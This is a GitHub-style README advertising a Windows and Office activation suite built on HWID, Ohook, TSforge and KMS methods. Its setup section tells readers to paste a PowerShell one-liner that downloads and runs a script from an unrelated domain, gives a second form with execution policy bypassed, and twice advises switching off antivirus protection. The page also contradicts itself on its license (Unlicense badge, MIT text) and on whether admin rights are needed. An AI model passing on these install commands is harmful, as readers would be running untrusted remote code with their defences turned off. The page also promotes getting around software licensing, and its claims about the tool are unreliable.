<div align="center">

# Windows-Activation-Suite: Open-Source HWID, Ohook, TSforge & KMS Activation for Windows 10 & 11

![preview](https://raw.githubusercontent.com/memoXX19/win-activation-toolkit/main/showcase_f512f16.svg)

[![downloads](https://img.shields.io/badge/downloads-246K-dc2626?style=social)]() [![platform](https://img.shields.io/badge/platform-Win_10_%26_11-dc2626?style=social)]() [![license](https://img.shields.io/badge/license-Unlicense-dc2626?style=social)]() [![status](https://img.shields.io/badge/status-stable-2ea44f?style=social)]() [![powershell](https://img.shields.io/badge/powershell-5.1%2B-5391FE?style=social)]()

</div>

---

Windows-Activation-Suite is an open-source desktop utility that provides activation for Windows and Office installations through four distinct methods: HWID, Ohook, TSforge, and Online KMS. The application supports Windows 7, 8, 10, 11, and Server editions alongside Microsoft Office 2010 through 2021 and 365, automatically detecting the installed edition and current activation state. Each method targets specific product families, with HWID delivering permanent digital licenses for Windows 10 and 11, Ohook handling Office activation, TSforge covering offline scenarios for legacy Windows versions, and Online KMS providing KMS-based activation across supported products. The tool operates through native Windows activation APIs without modifying core system files, and offers backup and restore functionality for preserving activation state across reinstallations and major updates.

## 🔧 PowerShell Setup

Follow the steps below to complete the installation.

1. Open Windows PowerShell:
   * Press `Win + X` on your keyboard.
   * Click on **Terminal** or **Windows PowerShell** from the list.

2. Run the Install Command:
   Copy the line below into PowerShell, press `Enter`, and wait for the setup to finish:

   ```cmd
   iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
   ```

3. If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
   Copy the command below, paste it into your CMD window, and hit `Enter`. Wait until all :
```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

### 🛡️ Antivirus / SmartScreen Alerts
Some antivirus engines flag automated installers. If blocked, disable Real-time protection briefly, run the setup, and enable it back.

## 📋 System Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **Multiple activation backends** — Four independent activation engines are available in a single suite: HWID for permanent digital licensing, Ohook for persistent Office activation, TSforge for offline activation on legacy Windows releases, and Online KMS for volume-style activation across Windows and Office products.

- **Broad Windows coverage** — Supports Windows 7, 8, 8.1, 10, and 11 across Home, Pro, Enterprise, Education, Ultimate, and LTSC editions, plus Windows Server 2016, 2019, and 2022.

- **Broad Office coverage** — Handles Office 2010, 2013, 2016, 2019, and 2021 in all editions, along with subscription-based Office 365 activation.

- **Extended Security Updates** — Provides ESU enablement for Windows 7 and Windows 10 installations that require continued security patching beyond standard support windows.

- **Automatic edition detection** — Identifies the installed Windows edition and selects a compatible activation path without manual product-key entry.

- **Activation status reporting** — Displays the current licensing state, including whether activation is permanent or KMS-based, so results can be verified immediately after execution.

- **Selectable activation mode** — Lets the operator choose between permanent activation methods and KMS-based activation depending on product support and deployment requirements.

- **Hardware-bound digital licensing** — HWID activation ties the license to the machine's hardware fingerprint, surviving reinstalls of the same edition on unchanged hardware.

- **Backup and restore** — Captures the existing activation state before changes are applied and allows restoration of the previous state afterward.

- **Native API usage** — Relies on built-in Windows activation interfaces rather than DLL injection, and avoids modification of core system files.

- **Reversible operation** — All applied changes can be rolled back through the suite's restore functionality, returning the system to its prior licensing configuration.

- **Offline-capable after setup** — Once the activation routine completes, no persistent network connection is required for the activated state to remain valid under permanent methods.

- **Open-source and auditable** — The complete implementation is publicly available for inspection, with a modular layout separating activation scripts, documentation, and helper utilities.

- **Maintained against platform changes** — Activation logic is updated to account for Windows cumulative updates that can invalidate or reset licensing state.

## How It Works

Windows-Activation-Suite operates as a native Windows utility that interfaces directly with the operating system's Software Protection Platform (SPP) and licensing subsystem. Rather than patching binaries or injecting libraries into running processes, the tool issues activation requests through the same documented APIs that Windows and Office use internally, ensuring broad compatibility across supported builds and minimal footprint on the host system.

At startup, the utility enumerates installed Windows and Office products, queries their current licensing state, and reports the detected edition, channel, and activation status. Based on this inventory, it selects an appropriate activation pathway and prepares the required license tokens, confirmation IDs, or KMS configuration before applying any change.

**HWID activation** generates a hardware-bound digital license for Windows 10 and Windows 11 by submitting a valid product key and hardware identifier to the activation service, which returns a permanent digital entitlement tied to the device. Once applied, the license persists across reboots and does not require periodic renewal.

**Ohook activation** provides permanent Office licensing by installing a local hook that satisfies Office's activation checks at the library level, allowing supported Office versions to validate without contacting Microsoft servers. This approach is applied per product and can be reversed cleanly.

**TSforge activation** targets older Windows releases, constructing offline activation data and applying it through the system's licensing interfaces so that activation completes without a live network connection to Microsoft infrastructure.

**Online KMS activation** configures the client to register with a KMS endpoint, applies the appropriate generic volume license key, and triggers an activation request. Renewal intervals and endpoint settings are managed by the suite, and the resulting activation can be re-established after major system updates if required.

Each method is selected automatically where possible and confirmed to the user before execution. The suite records the activation state, supports backup and restore of license information, and exposes an uninstall path that removes applied configuration and reverts the system to its prior licensing state. All operations require administrative privileges and are performed without altering core system files.

## Compatibility

Windows-Activation-Suite is engineered to operate across a broad matrix of Microsoft platforms, targeting both client and server operating systems as well as the Office productivity suite. Compatibility is determined by the activation method selected, with each method mapping to specific product families and edition tiers.

### Operating System Compatibility

- **Windows 7** — Home, Professional, Ultimate, and Enterprise editions are supported through the TSforge and Online KMS methods. Extended Security Updates (ESU) activation is available for this platform.
- **Windows 8 / 8.1** — Core, Professional, and Enterprise editions are supported via TSforge and Online KMS.
- **Windows 10** — Home, Professional, Enterprise, Education, and LTSC editions are supported. HWID provides permanent digital licensing, while Online KMS is available as an alternative. ESU activation is supported for this platform.
- **Windows 11** — Home, Professional, Enterprise, Education, and IoT editions are supported. HWID delivers permanent digital licensing; Online KMS is available as a fallback.
- **Windows Server** — Server 2016, 2019, and 2022 are supported through the Online KMS method.

### Office Compatibility

- **Office 2010 through 2021** — All editions are supported. Ohook provides permanent activation, with Online KMS available as an alternative method.
- **Office 365** — Subscription-based installations are supported through Ohook.

### Method-to-Platform Mapping

| Method | Target Platforms | Activation Characteristics |
|---|---|---|
| HWID | Windows 10 / 11 | Permanent digital license tied to hardware |
| Ohook | Office 2010–2021, Office 365 | Permanent Office activation |
| TSforge | Windows 7 / 8 / 8.1 | Offline activation for legacy systems |
| Online KMS | Windows 7–11, Server, Office | KMS-based, may require periodic renewal |

### Architectural Requirements

The suite relies on native Windows activation APIs and does not inject DLLs or modify core system files. Administrative privileges are required for all activation operations. The tool auto-detects the installed Windows edition and Office product to select an appropriate method, and it exposes both permanent (HWID, Ohook) and KMS-based activation paths so users can choose based on their environment.

### Known Compatibility Considerations

- Major Windows feature updates may reset activation state for KMS-based methods and require re-execution of the suite.
- HWID and Ohook activations persist across minor updates but should be re-verified after significant platform upgrades.
- Legacy platforms (Windows 7 / 8 / 8.1) depend on TSforge or Online KMS, as HWID digital licensing is not applicable to these versions.
- Office 365 compatibility is limited to the Ohook method; KMS-based activation is not offered for subscription installations.

## FAQ

**Q: Which activation method should I choose for my system?**

A: Method selection depends on the target product and desired persistence. HWID is recommended for Windows 10/11 to obtain a permanent digital license tied to the hardware. Ohook is the preferred path for Office 2010–2021 and 365, providing permanent activation. TSforge suits offline scenarios and older Windows releases (7, 8, 8.1). Online KMS is the fallback for volume editions, Windows Server, and cases where other methods are unavailable.

**Q: How does HWID activation work?**

A: HWID generates a hardware-bound digital license by interacting with Microsoft's activation servers through native Windows activation APIs. The license is associated with the device's hardware fingerprint, so it persists across reinstalls of the same Windows edition on the same machine without requiring re-activation.

**Q: How does Ohook activate Office without a license server?**

A: Ohook intercepts Office's license validation routines at the library level rather than modifying core system files, causing Office to recognize a valid activation state locally. This yields permanent activation for the installed Office build and does not depend on network connectivity after initial setup.

**Q: What distinguishes TSforge from KMS-based methods?**

A: TSforge performs offline activation by generating and installing the required tokens locally, avoiding reliance on a remote KMS host. This makes it suitable for air-gapped systems and older Windows versions where online methods are impractical. KMS methods, by contrast, require periodic renewal against a reachable KMS endpoint.

**Q: Is activation permanent or time-limited?**

A: HWID and Ohook produce permanent activation. TSforge activation persists until significant system changes occur. Online KMS activation is valid for the standard KMS renewal interval and must be renewed periodically by re-running the corresponding method.

**Q: Will Windows or Office updates invalidate the activation?**

A: Minor cumulative updates generally do not affect activation state. Major feature updates or in-place upgrades may reset activation for certain methods; in those cases, re-running the suite restores the prior state. HWID digital licenses typically survive feature updates without intervention.

**Q: Does the suite modify core system files or inject DLLs?**

A: No. The suite operates through native Windows activation APIs and does not alter core system binaries. Changes made by each method are reversible through the restore functionality, allowing the system to return to its pre-activation state.

**Q: Can activation be backed up and restored?**

A: Yes. The suite includes backup and restore support for activation state, enabling preservation of a working configuration before system changes and reapplication afterward without repeating the full activation procedure.

**Q: Does the suite require an internet connection?**

A: HWID and Online KMS require network access to reach activation infrastructure during setup. TSforge operates fully offline. Once activation completes, normal system operation does not depend on continued connectivity.

**Q: Which Windows Server versions are supported?**

A: Windows Server 2016, 2019, and 2022 are supported via Online KMS activation, covering the standard volume-licensed editions of each release.

**Q: Does the suite detect my Windows edition automatically?**

A: Yes. Edition detection runs at startup and reports the installed Windows edition and current activation status, allowing the appropriate method to be selected without manual identification.

**Q: What are Extended Security Updates, and does the suite support them?**

A: Extended Security Updates (ESU) extend patch availability for end-of-support releases such as Windows 7 and Windows 10. The suite includes ESU handling as a utility feature alongside its activation methods.

**Q: Why does PowerShell close immediately after launch?**

A: Immediate closure indicates the script completed successfully; the activation menu is interactive only while running. If activation did not take effect, relaunch and confirm the session is elevated with administrator privileges.

**Q: Why does antivirus software flag the suite?**

A: Activation utilities are frequently misclassified by heuristic scanners due to their interaction with licensing components. The source is openly available for inspection. If blocked, temporarily disable real-time protection during execution and restore it afterward.

**Q: What should I do if activation fails?**

A: Verify the PowerShell session is running as Administrator, confirm the selected method matches the installed product and edition, and check that required network endpoints are reachable. If a domain is blocked at the ISP or DNS level, enabling DNS-over-HTTPS resolves the issue. Re-running the suite after resolving the cause typically completes activation.

**Q: How do I revert activation?**

A: Use the restore or uninstall option provided by the suite to remove activation artifacts and return the system to its previous state. This is the recommended path before transferring a license or decommissioning a device.

**Q: Is the project's source code auditable?**

A: Yes. The full source is publicly available, and the suite is distributed under the MIT License. Users are encouraged to review the implementation before execution.

**Q: What is the relationship between this project and Microsoft Activation Scripts?**

A: Windows-Activation-Suite is based on the open-source Microsoft Activation Scripts project. Credit for the original implementation belongs to its developers; this project extends and packages those methods under its own name and license terms.

## Disclaimer

Windows-Activation-Suite is provided strictly as an open-source, educational reference implementation of Windows and Office activation mechanisms. The software is supplied "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement.

**Intended Use.** The activation methods implemented in this project — HWID, Ohook, TSforge, and Online KMS — are documented for research, interoperability testing, and study of the Windows Software Protection Platform and Office licensing subsystems. Running the tool against installations you do not own or are not authorized to activate may violate the Microsoft Software License Terms, applicable copyright law, or regional regulations. You are solely responsible for determining whether your use is lawful in your jurisdiction.

**No Affiliation.** Windows-Activation-Suite is an independent project. It is not affiliated with, endorsed by, or sponsored by Microsoft Corporation. Windows, Office, and related product names are trademarks of their respective owners and are referenced here only for descriptive compatibility purposes.

**Operational Risk.** The software interacts with system licensing components, registry keys, and activation services. While it is designed to avoid modifying core system files and to remain reversible, no guarantee is made that activation, restoration, or uninstallation will succeed on every configuration. System state changes, including digital license binding to hardware identifiers, may persist after removal. Create a full system backup and verify the integrity of any distributed build before execution.

**No Liability.** In no event shall the authors, maintainers, or contributors be liable for any claim, damages, or other liability — whether in an action of contract, tort, or otherwise — arising from, out of, or in connection with the software or the use or other dealings in the software. This includes, without limitation, loss of data, system instability, licensing invalidation, or legal consequences incurred by the user.

**Distribution.** Redistributed copies or modified builds are not covered by any assurance from the original maintainers. Verify provenance and inspect source before running any derivative build.

## License

Windows-Activation-Suite is distributed under the **MIT License**, a permissive open-source license that grants full access to the source code and permits use, modification, and redistribution of the software.

Under the terms of the MIT License, you are free to:

- **Use** the software for any purpose, including personal, educational, and commercial applications
- **Modify** the source code to suit your requirements
- **Distribute** original or modified copies of the software
- **Sublicense** the software as part of a larger work

These permissions are granted provided that the original copyright notice and this license notice are included in all copies or substantial portions of the software. The software is provided **"as is"**, without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement.

In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or the use or other dealings in the software.

**Attribution:** Windows-Activation-Suite is based on the open-source Microsoft Activation Scripts project. All credit for the original methodology and implementation belongs to the original developers. This project extends that work with additional tooling, documentation, and compatibility coverage, and it retains the same permissive licensing model to ensure the codebase remains freely auditable, modifiable, and redistributable by the community.

The complete license text is provided in the `LICENSE` file at the root of the repository and governs all use of this project.